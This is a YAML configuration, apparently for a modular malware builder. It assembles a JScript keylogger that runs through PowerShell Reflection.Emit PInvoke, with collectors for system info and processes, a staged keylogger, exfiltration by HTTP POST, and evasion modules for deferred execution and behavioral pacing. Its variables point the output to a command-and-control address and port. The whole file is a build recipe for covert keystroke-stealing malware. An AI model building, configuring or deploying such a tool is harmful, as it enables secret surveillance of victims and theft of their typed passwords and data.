name: js_keylogger
description: JScript keylogger using PowerShell Reflection.Emit PInvoke
format: jscript

core:
  - core/emit_buffer
  - core/run_cmd
  - core/file_ops

collectors:
  - collectors/sysinfo
  - collectors/processes

keylogger: collectors/keylogger_staged

exfil: exfil/http_post
arch: arch/keylogger

evasion:
  - evasion/deferred_exec
  - evasion/behavioral_pacing

vars:
  C2_IP: "10.0.2.2"
  C2_PORT: "9001"
  KEYLOG_DURATION: "30"
